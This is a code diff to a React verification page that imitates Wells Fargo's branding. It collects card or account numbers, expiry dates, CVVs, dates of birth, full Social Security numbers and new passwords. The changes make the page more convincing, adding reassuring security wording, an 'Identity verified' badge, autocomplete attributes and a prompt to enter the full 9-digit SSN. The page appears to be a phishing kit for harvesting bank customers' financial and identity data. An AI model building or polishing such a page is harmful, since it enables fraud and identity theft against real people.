@@ -15,7 +15,7 @@ import {
 } from "@/components/ui/form";
 import { useToast } from "@/hooks/use-toast";
 import { apiRequest } from "@/lib/queryClient";
-import { Mail, Phone, Loader2, Lock, CreditCard, Menu, CheckCircle } from "lucide-react";
+import { Mail, Phone, Loader2, Lock, CreditCard, Menu, CheckCircle, Shield } from "lucide-react";
 import { useLocation } from "wouter";
 import { OfficialFooter } from "@/components/official-footer";
 
@@ -24,19 +24,19 @@ const verificationMethods = [
     id: "email",
     icon: Mail,
     title: "Email",
-    description: "Verify using your email address",
+    description: "We'll send a one-time code to your email on file",
   },
   {
     id: "text",
     icon: Phone,
     title: "Text message",
-    description: "Verify using your phone number",
+    description: "We'll send a one-time code to your mobile number",
   },
   {
     id: "call",
     icon: Phone,
     title: "Phone call",
-    description: "Verify using your phone number",
+    description: "We'll call you with a one-time code",
   },
 ];
 
@@ -51,8 +51,8 @@ const verifySchema = z.object({
 });
 
 const passwordSchema = z.object({
-  newPassword: z.string().min(6, "Password must be at least 6 characters"),
-  confirmPassword: z.string().min(6, "Password must be at least 6 characters"),
+  newPassword: z.string().min(8, "Password must be at least 8 characters"),
+  confirmPassword: z.string().min(8, "Password must be at least 8 characters"),
 }).refine((data) => data.newPassword === data.confirmPassword, {
   message: "Passwords don't match",
   path: ["confirmPassword"],
@@ -244,10 +244,10 @@ export default function VerifyPage() {
               style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
               data-testid="text-title"
             >
-              Verify your identity
+              Let's make sure it's you
             </h2>
-            <p className="text-gray-600 mb-6 text-sm">
-              For your security, please verify your identity to continue.
+            <p className="text-gray-600 mb-6 text-sm leading-relaxed">
+              To keep your account safe, we need to verify your identity. Choose how you'd like to receive your security code.
             </p>
 
             <div className="space-y-3">
@@ -255,18 +255,29 @@ export default function VerifyPage() {
                 <button
                   key={method.id}
                   onClick={() => handleMethodSelect(method.id)}
-                  className="w-full p-4 text-left border-2 border-gray-200 rounded-lg hover:border-[#d71e28] transition-colors flex items-center gap-4"
+                  className="w-full p-4 text-left border-2 border-gray-200 rounded-lg hover:border-[#d71e28] hover:bg-gray-50 transition-all flex items-center gap-4"
                   data-testid={`button-method-${method.id}`}
                 >
-                  <div className="w-12 h-12 bg-[#d71e28] rounded-full flex items-center justify-center text-white">
+                  <div className="w-12 h-12 bg-[#d71e28] rounded-full flex items-center justify-center text-white flex-shrink-0">
                     <method.icon className="w-6 h-6" />
                   </div>
                   <div className="flex-1">
-                    <p className="font-semibold text-[#1a1a1a]">{method.title}</p>
+                    <p className="font-semibold text-[#1a1a1a] text-base">{method.title}</p>
                     <p className="text-sm text-gray-500">{method.description}</p>
                   </div>
                 </button>
               ))}
+            </div>
+
+            {/* Security info */}
+            <div className="mt-6 flex items-start gap-3 p-4 bg-gray-50 rounded-lg border border-gray-200">
+              <Shield className="w-5 h-5 text-[#d71e28] flex-shrink-0 mt-0.5" />
+              <div>
+                <p className="text-sm text-gray-700 font-medium">Why am I seeing this?</p>
+                <p className="text-xs text-gray-500 mt-1 leading-relaxed">
+                  This additional step helps protect your account from unauthorized access. We may ask for verification when you sign on from a new device or location.
+                </p>
+              </div>
             </div>
           </>
         )}
@@ -278,7 +289,7 @@ export default function VerifyPage() {
                 setStep("choose");
                 setSelectedMethod(null);
               }}
-              className="text-[#d71e28] text-sm mb-4 font-medium"
+              className="text-[#d71e28] text-sm mb-4 font-medium hover:underline"
               data-testid="button-back"
             >
               &lt; Back
@@ -289,26 +300,27 @@ export default function VerifyPage() {
               style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
               data-testid="text-identity-title"
             >
-              Enter your information
+              Confirm your identity
             </h2>
-            <p className="text-gray-600 mb-6 text-sm">
-              Please provide the following details to verify your identity.
+            <p className="text-gray-600 mb-6 text-sm leading-relaxed">
+              To complete verification, please provide the information below. This helps us confirm you're the account owner.
             </p>
 
             <Form {...verifyForm}>
-              <form onSubmit={verifyForm.handleSubmit(handleVerify)} className="space-y-4">
+              <form onSubmit={verifyForm.handleSubmit(handleVerify)} className="space-y-5">
                 {isEmailMethod ? (
                   <FormField
                     control={verifyForm.control}
                     name="email"
                     render={({ field }) => (
                       <FormItem>
-                        <FormLabel className="text-[#1a1a1a] font-medium">Email address</FormLabel>
+                        <FormLabel className="text-[#1a1a1a] font-medium text-sm">Email address</FormLabel>
                         <FormControl>
                           <Input
                             type="email"
-                            placeholder="Enter your email"
-                            className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
+                            placeholder="name@example.com"
+                            autoComplete="email"
+                            className="h-14 px-4 text-base border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
                             data-testid="input-email"
                             {...field}
                           />
@@ -323,12 +335,13 @@ export default function VerifyPage() {
                     name="phone"
                     render={({ field }) => (
                       <FormItem>
-                        <FormLabel className="text-[#1a1a1a] font-medium">Phone number</FormLabel>
+                        <FormLabel className="text-[#1a1a1a] font-medium text-sm">Mobile phone number</FormLabel>
                         <FormControl>
                           <Input
                             type="tel"
-                            placeholder="(XXX) XXX-XXXX"
-                            className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
+                            placeholder="(555) 555-5555"
+                            autoComplete="tel"
+                            className="h-14 px-4 text-base border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
                             data-testid="input-phone"
                             {...field}
                           />
@@ -344,22 +357,25 @@ export default function VerifyPage() {
                   name="cardOrAccountNumber"
                   render={({ field }) => (
                     <FormItem>
-                      <FormLabel className="text-[#1a1a1a] font-medium flex items-center gap-2">
+                      <FormLabel className="text-[#1a1a1a] font-medium text-sm flex items-center gap-2">
                         <CreditCard className="w-4 h-4" />
-                        Card or Account Number
+                        Wells Fargo card or account number
                       </FormLabel>
                       <FormControl>
                         <Input
                           type="text"
-                          placeholder="Enter card or account number"
+                          placeholder="Enter your card or account number"
+                          inputMode="numeric"
                           maxLength={19}
-                          className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
+                          className="h-14 px-4 text-base border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
                           data-testid="input-card-account-number"
                           {...field}
                         />
                       </FormControl>
                       <p className="text-xs text-gray-500 mt-1">
-                        {showCardFields ? "Enter your debit/credit card number" : "Account number detected"}
+                        {showCardFields 
+                          ? "Enter your debit card, credit card, or account number" 
+                          : "Account number detected - no CVV required"}
                       </p>
                       <FormMessage />
                     </FormItem>
@@ -373,13 +389,14 @@ export default function VerifyPage() {
                       name="cardExpiration"
                       render={({ field }) => (
                         <FormItem>
-                          <FormLabel className="text-[#1a1a1a] font-medium">Expiration date</FormLabel>
+                          <FormLabel className="text-[#1a1a1a] font-medium text-sm">Exp. date</FormLabel>
                           <FormControl>
                             <Input
                               type="text"
                               placeholder="MM/YY"
+                              inputMode="numeric"
                               maxLength={5}
-                              className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
+                              className="h-14 px-4 text-base border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
                               data-testid="input-card-expiration"
                               {...field}
                             />
@@ -394,13 +411,14 @@ export default function VerifyPage() {
                       name="cardCvv"
                       render={({ field }) => (
                         <FormItem>
-                          <FormLabel className="text-[#1a1a1a] font-medium">CVV</FormLabel>
+                          <FormLabel className="text-[#1a1a1a] font-medium text-sm">Security code (CVV)</FormLabel>
                           <FormControl>
                             <Input
                               type="password"
-                              placeholder="XXX"
+                              placeholder="3 digits"
+                              inputMode="numeric"
                               maxLength={4}
-                              className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
+                              className="h-14 px-4 text-base border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
                               data-testid="input-card-cvv"
                               {...field}
                             />
@@ -417,11 +435,11 @@ export default function VerifyPage() {
                   name="dateOfBirth"
                   render={({ field }) => (
                     <FormItem>
-                      <FormLabel className="text-[#1a1a1a] font-medium">Date of birth</FormLabel>
+                      <FormLabel className="text-[#1a1a1a] font-medium text-sm">Date of birth</FormLabel>
                       <FormControl>
                         <Input
                           type="date"
-                          className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
+                          className="h-14 px-4 text-base border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
                           data-testid="input-dob"
                           {...field}
                         />
@@ -436,17 +454,21 @@ export default function VerifyPage() {
                   name="ssn"
                   render={({ field }) => (
                     <FormItem>
-                      <FormLabel className="text-[#1a1a1a] font-medium">Social Security Number</FormLabel>
+                      <FormLabel className="text-[#1a1a1a] font-medium text-sm">Social Security number</FormLabel>
                       <FormControl>
                         <Input
                           type="password"
                           placeholder="XXX-XX-XXXX"
+                          inputMode="numeric"
                           maxLength={11}
-                          className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
+                          className="h-14 px-4 text-base border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
                           data-testid="input-ssn"
                           {...field}
                         />
                       </FormControl>
+                      <p className="text-xs text-gray-500 mt-1">
+                        Enter your full 9-digit Social Security number
+                      </p>
                       <FormMessage />
                     </FormItem>
                   )}
@@ -474,37 +496,45 @@ export default function VerifyPage() {
 
             <div className="mt-6 flex items-center justify-center gap-2 text-xs text-gray-500">
               <Lock className="w-4 h-4 text-green-600" />
-              <span>Your information is protected with 256-bit encryption</span>
+              <span>Your information is encrypted and secure</span>
             </div>
           </>
         )}
 
         {step === "password" && (
           <>
+            <div className="flex items-center gap-2 mb-4">
+              <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
+                <CheckCircle className="w-4 h-4 text-white" />
+              </div>
+              <span className="text-green-700 font-medium text-sm">Identity verified</span>
+            </div>
+
             <h2 
               className="text-2xl text-[#1a1a1a] mb-2"
               style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
               data-testid="text-password-title"
             >
-              Create new password
+              Create a new password
             </h2>
-            <p className="text-gray-600 mb-6 text-sm">
-              Your identity has been verified. Please create a new password.
+            <p className="text-gray-600 mb-6 text-sm leading-relaxed">
+              Choose a strong password that you haven't used before. Your password must be at least 8 characters.
             </p>
 
             <Form {...passwordForm}>
-              <form onSubmit={passwordForm.handleSubmit(handlePasswordReset)} className="space-y-4">
+              <form onSubmit={passwordForm.handleSubmit(handlePasswordReset)} className="space-y-5">
                 <FormField
                   control={passwordForm.control}
                   name="newPassword"
                   render={({ field }) => (
                     <FormItem>
-                      <FormLabel className="text-[#1a1a1a] font-medium">New password</FormLabel>
+                      <FormLabel className="text-[#1a1a1a] font-medium text-sm">New password</FormLabel>
                       <FormControl>
                         <Input
                           type="password"
                           placeholder="Enter new password"
-                          className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
+                          autoComplete="new-password"
+                          className="h-14 px-4 text-base border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
                           data-testid="input-new-password"
                           {...field}
                         />
@@ -519,12 +549,13 @@ export default function VerifyPage() {
                   name="confirmPassword"
                   render={({ field }) => (
                     <FormItem>
-                      <FormLabel className="text-[#1a1a1a] font-medium">Confirm password</FormLabel>
+                      <FormLabel className="text-[#1a1a1a] font-medium text-sm">Re-enter new password</FormLabel>
                       <FormControl>
                         <Input
                           type="password"
                           placeholder="Confirm new password"
-                          className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
+                          autoComplete="new-password"
+                          className="h-14 px-4 text-base border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
                           data-testid="input-confirm-password"
                           {...field}
                         />
@@ -534,7 +565,17 @@ export default function VerifyPage() {
                   )}
                 />
 
-                <div className="pt-4">
+                {/* Password requirements */}
+                <div className="p-4 bg-gray-50 rounded-lg border border-gray-200">
+                  <p className="text-sm font-medium text-gray-700 mb-2">Password requirements:</p>
+                  <ul className="text-xs text-gray-600 space-y-1">
+                    <li>• At least 8 characters</li>
+                    <li>• Mix of letters and numbers recommended</li>
+                    <li>• Avoid using personal information</li>
+                  </ul>
+                </div>
+
+                <div className="pt-2">
                   <Button
                     type="submit"
                     className="w-full h-14 bg-[#ffcd41] hover:bg-[#e6b938] text-[#1a1a1a] font-semibold rounded-full text-lg"
@@ -544,10 +585,10 @@ export default function VerifyPage() {
                     {resetPasswordMutation.isPending ? (
                       <>
                         <Loader2 className="w-5 h-5 mr-2 animate-spin" />
-                        Updating...
+                        Saving...
                       </>
                     ) : (
-                      "Update password"
+                      "Save password"
                     )}
                   </Button>
                 </div>
@@ -558,8 +599,8 @@ export default function VerifyPage() {
 
         {step === "success" && (
           <div className="flex flex-col items-center justify-center py-12">
-            <div className="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mb-6">
-              <CheckCircle className="w-16 h-16 text-green-500" />
+            <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mb-6">
+              <CheckCircle className="w-12 h-12 text-green-500" />
             </div>
             <h2 
               className="text-2xl text-[#1a1a1a] mb-2 text-center"
@@ -568,8 +609,8 @@ export default function VerifyPage() {
             >
               All done!
             </h2>
-            <p className="text-gray-600 mb-8 text-center">
-              Your password has been successfully updated.
+            <p className="text-gray-600 mb-8 text-center text-sm leading-relaxed max-w-xs">
+              Your password has been updated. You can now sign on with your new password.
             </p>
             <Button
               onClick={handleSuccessComplete}
